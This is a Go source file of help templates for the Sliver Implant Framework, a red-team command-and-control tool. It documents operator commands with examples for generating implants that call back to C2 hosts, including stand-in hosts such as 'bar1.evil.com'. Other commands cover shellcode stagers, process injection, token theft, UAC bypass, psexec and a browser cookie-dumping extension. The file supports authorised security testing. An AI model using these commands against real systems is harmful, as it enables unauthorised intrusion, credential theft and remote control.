package help

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	---
	This file contains all of the long-form help templates, all commands should have a long form help,
	even if the command is pretty simple. Try to include example commands in your template.
*/

import (
	"bytes"
	"text/template"

	consts "github.com/bishopfox/sliver/client/constants"
)

var (
	cmdHelp = map[string]string{
		consts.JobsStr:            jobsHelp,
		consts.SessionsStr:        sessionsHelp,
		consts.BackgroundStr:      backgroundHelp,
		consts.InfoStr:            infoHelp,
		consts.UseStr:             useHelp,
		consts.GenerateStr:        generateHelp,
		consts.NewProfileStr:      newProfileHelp,
		consts.ProfileGenerateStr: generateProfileHelp,
		consts.StagerStr:          generateStagerHelp,
		consts.StageListenerStr:   stageListenerHelp,

		consts.MsfStr:              msfHelp,
		consts.MsfInjectStr:        msfInjectHelp,
		consts.PsStr:               psHelp,
		consts.PingStr:             pingHelp,
		consts.KillStr:             killHelp,
		consts.LsStr:               lsHelp,
		consts.CdStr:               cdHelp,
		consts.CatStr:              catHelp,
		consts.DownloadStr:         downloadHelp,
		consts.UploadStr:           uploadHelp,
		consts.MkdirStr:            mkdirHelp,
		consts.RmStr:               rmHelp,
		consts.ProcdumpStr:         procdumpHelp,
		consts.ElevateStr:          elevateHelp,
		consts.RunAsStr:            runAsHelp,
		consts.ImpersonateStr:      impersonateHelp,
		consts.RevToSelfStr:        revToSelfHelp,
		consts.ExecuteAssemblyStr:  executeAssemblyHelp,
		consts.ExecuteShellcodeStr: executeShellcodeHelp,
		consts.MigrateStr:          migrateHelp,
		consts.SideloadStr:         sideloadHelp,
		consts.TerminateStr:        terminateHelp,
		consts.LoadExtensionStr:    loadExtensionHelp,

		consts.WebsitesStr:   websitesHelp,
		consts.ScreenshotStr: screenshotHelp,
	}

	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
	[[.Bold]]About:[[.Normal]] Manage jobs/listeners.`

	sessionsHelp = `[[.Bold]]Command:[[.Normal]] sessions <options>
[[.Bold]]About:[[.Normal]] List Sliver sessions, and optionally interact or kill a session.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active Sliver.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <sliver name/session>
[[.Bold]]About:[[.Normal]] Get information about a Sliver by name, or for the active Sliver.`

	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name/session]
[[.Bold]]About:[[.Normal]] Switch the active Sliver, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

[[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


[[.Bold]][[.Underline]]++ Formats ++[[.Normal]]
Supported output formats are Windows PE, Windows DLL, Windows Shellcode (SRDI), Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
	generate --mtls foo.example.com 
	generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
	generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
	generate --os mac --mtls foo.example.com 

To output a Linux ELF executable file, the following command would be used:
	generate --os linux --mtls foo.example.com 


[[.Bold]][[.Underline]]++ DNS Canaries ++[[.Normal]]
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
and which implant file was discovered along with any affected sessions.

[[.Bold]]Important:[[.Normal]] You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
canaries and their status using the "canaries" command:
	generate --mtls foo.example.com --canary 1.foobar.com

[[.Bold]][[.Underline]]++ Execution Limits ++[[.Normal]]
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help new-profile'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.
`
	generateStagerHelp = `[[.Bold]]Command:[[.Normal]] generate stager <options>
[[.Bold]]About:[[.Normal]] Generate a new sliver stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --format.

[[.Bold]][[.Underline]]++ Bad Characters ++[[.Normal]]
Bad characters must be specified like this for single bytes:

generate stager -b 00

And like this for multiple bytes:

generate stager -b '00 0a cc'

[[.Bold]][[.Underline]]++ Output Formats ++[[.Normal]]
You can use the --output-format flag to print out the shellcode to stdout, in one of the following transform formats:
[[.Bold]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
`
	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
[[.Bold]]Examples:[[.Normal]] 

The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile

To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:

new-profile --name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
`

	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--name] <options>
[[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
	new-profile --name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
	generate-profile mtls-profile
`

	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate-profile [name] <options>
[[.Bold]]About:[[.Normal]] Generate a Sliver from a saved profile (see new-profile).`

	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`

	msfInjectHelp = `[[.Bold]]Command:[[.Normal]] inject [--pid] [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in a remote process.`

	psHelp = `[[.Bold]]Command:[[.Normal]] ps <options>
[[.Bold]]About:[[.Normal]] List processes on remote system.`

	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <sliver name/session>
[[.Bold]]About:[[.Normal]] Ping Sliver by name or the active sliver. This does NOT send an ICMP packet, it just sends an empty 
c2 message round trip to ensure the remote Sliver is still responding to commands.`

	killHelp = `[[.Bold]]Command:[[.Normal]] kill <sliver name/session>
[[.Bold]]About:[[.Normal]] Kill a remote sliver process (does not delete file).`

	lsHelp = `[[.Bold]]Command:[[.Normal]] ls <remote path>
[[.Bold]]About:[[.Normal]] List remote files in current directory, or path if provided.`

	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [remote path]
[[.Bold]]About:[[.Normal]] Change working directory of the active Sliver.`

	pwdHelp = `[[.Bold]]Command:[[.Normal]] pwd
[[.Bold]]About:[[.Normal]] Print working directory of the active Sliver.`

	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir [remote path]
[[.Bold]]About:[[.Normal]] Create a remote directory.`

	rmHelp = `[[.Bold]]Command:[[.Normal]] rm [remote path]
[[.Bold]]About:[[.Normal]] Delete a remote file or directory.`

	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path> 
[[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`

	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
[[.Bold]]About:[[.Normal]] Download a file from the remote system.`

	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
[[.Bold]]About:[[.Normal]] Upload a file to the remote system.`

	procdumpHelp = `[[.Bold]]Command:[[.Normal]] procdump [pid]
[[.Bold]]About:[[.Normal]] Dumps the process memory given a process identifier (pid)`

	runAsHelp = `[[.Bold]]Command:[[.Normal]] runas [--username] [--process] [--args]
[[.Bold]]About:[[.Normal]] (Windows Only) Run a new process in the context of the designated user`

	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate USERNAME
[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Sliver commands that runs new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`

	revToSelfHelp = `[[.Bold]]Command:[[.Normal]] rev2self
[[.Bold]]About:[[.Normal]] (Windows Only) Call RevertToSelf, lose the stolen token.`

	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new sliver session as an elevated process (UAC bypass)`

	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly [local path to assembly] [arguments]
[[.Bold]]About:[[.Normal]] (Windows Only) Executes the .NET assembly in a child process.
`

	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode [local path to raw shellcode]
[[.Bold]]About:[[.Normal]] Executes the given shellcode in the Sliver process.

[[.Bold]][[.Underline]]++ Shellcode ++[[.Normal]]
Shellcode files should be binary encoded, you can generate Sliver shellcode files with the generate command:
	generate --format shellcode
`

	migrateHelp = `[[.Bold]]Command:[[.Normal]] migrate <pid>
[[.Bold]]About:[[.Normal]] (Windows Only) Migrates into the process designated by <pid>.`

	websitesHelp = `[[.Bold]]Command:[[.Normal]] websites <options> <operation>
[[.Bold]]About:[[.Normal]] Add content to HTTP(S) C2 websites to make them look more legit.

[[.Bold]][[.Underline]]++ Operations ++[[.Normal]]
Operations are used to manage the content of each website and go at the end of the command.

[[.Bold]]ls [[.Normal]] - List the contents of a website, specified with --website
[[.Bold]]add[[.Normal]] - Add content to a website, specified with --website, --content, and --web-path
[[.Bold]]rm [[.Normal]] - Remove content from a website, specified with --website and --web-path

[[.Bold]][[.Underline]]++ Examples ++[[.Normal]]

Add content to a website:
	websites --website blog --web-path / --content ./index.html add
	websites --website blog --web-path /public --content ./public --recursive add

Delete content in a website:
	websites --website blog --web-path /index.html rm
	websites --website blog --web-path /public --recursive rm

`
	sideloadHelp = `[[.Bold]]Command:[[.Normal]] sideload <options> <filepath to DLL>
[[.Bold]]About:[[.Normal]] Load and execute a shared library in memory in a remote process.
[[.Bold]]Example usage:[[.Normal]]

Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
	sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
Sideload a Linux shared library into a new bash process using LD_PRELOAD:
	sideload -p /bin/bash /tmp/mylib.so
Sideload a Windows DLL as shellcode in a new process using sRDI, specifying the entrypoint and its arguments:
	sideload -a "hello world" -e MyEntryPoint /tmp/mylib.dll

[[.Bold]]Remarks:[[.Normal]]
Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
terminates before responding. This will also prevent the hosting process to run indefinitely.
This is not required on Windows since the payload is injected as a new remote thread, and we wait for the thread completion before
killing the hosting process.

Parameters to the Linux and MacOS shared module are passed using the [[.Bold]]LD_PARAMS[[.Normal]] environment variable.
`
	spawnDllHelp = `[[.Bold]]Command:[[.Normal]] spawndll <options> <filepath to DLL> [entrypoint arguments]
[[.Bold]]About:[[.Normal]] Load and execute a Reflective DLL in memory in a remote process.

[[.Bold]]--process[[.Normal]] - Process to inject into.
[[.Bold]]--export[[.Normal]] - Name of the export to call (default: ReflectiveLoader)
`

	terminateHelp = `[[.Bold]]Command:[[.Normal]] terminate PID
[[.Bold]]About:[[.Normal]] Kills a remote process designated by PID
`

	screenshotHelp = `[[.Bold]]Command:[[.Normal]] screenshot
[[.Bold]]About:[[.Normal]] Take a screenshot from the remote implant.
`
	loadExtensionHelp = `[[.Bold]]Command:[[.Normal]] load-extension <directory path> 
[[.Bold]]About:[[.Normal]] Load a Sliver extension to add new commands.
Extensions are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the extension file is a reflective DLL or not.
Load an extension:
	load /tmp/chrome-dump
Sliver extensions have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] extension):
chrome-dump
├── chrome-dump.dll
├── chrome-dump.so
└── manifest.json
It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
{
  "extensionName":"chrome-dump", // name of the extension, can be anything
  "extensionCommands":[
    {
      "name":"chrome-dump", // name of the command available in the sliver client (no space)
      "entrypoint":"ChromeDump", // entrypoint of the shared library to execute
      "help":"Dump Google Chrome cookies", // short help message
      "allowArgs":false,  // make it true if the commands require arguments
	  "defaultArgs": "test", // if you need to pass a default argument
      "extFiles":[ // list of files, groupped per target OS
        {
		  "os":"windows", // Target OS for the following files. Values can be "windows", "linux" or "darwin"
          "files":{
            "x64":"chrome-dump.dll",
            "x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the extension directory
          }
        },
        {
          "os":"linux",
          "files":{
            "x64":"chrome-dump.so"
          }
        },
        {
          "os":"darwin",
          "files":{
            "x64":"chrome-dump.dylib"
          }
        }
      ],
      "isReflective":false // only set to true when using a reflective DLL
    }
  ]
}

Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which allows you to specify the process to inject into. The following default values are set:
 - Windows: c:\windows\system32\notepad.exe
 - Linux: /bin/bash
 - Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment
`
psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
[[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.
`
)

const (
	// ANSI Colors
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"
)

// GetHelpFor - Get help string for a command
func GetHelpFor(cmdName string) string {
	if 0 < len(cmdName) {
		if helpTmpl, ok := cmdHelp[cmdName]; ok {
			return FormatHelpTmpl(helpTmpl)
		}
	}
	return ""
}

// FormatHelpTmpl - Applies format template to help string
func FormatHelpTmpl(helpStr string) string {
	outputBuf := bytes.NewBufferString("")
	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(helpStr)
	tmpl.Execute(outputBuf, struct {
		Normal    string
		Bold      string
		Underline string
		Black     string
		Red       string
		Green     string
		Orange    string
		Blue      string
		Purple    string
		Cyan      string
		Gray      string
	}{
		Normal:    normal,
		Bold:      bold,
		Underline: underline,
		Black:     black,
		Red:       red,
		Green:     green,
		Orange:    orange,
		Blue:      blue,
		Purple:    purple,
		Cyan:      cyan,
		Gray:      gray,
	})
	return outputBuf.String()
}
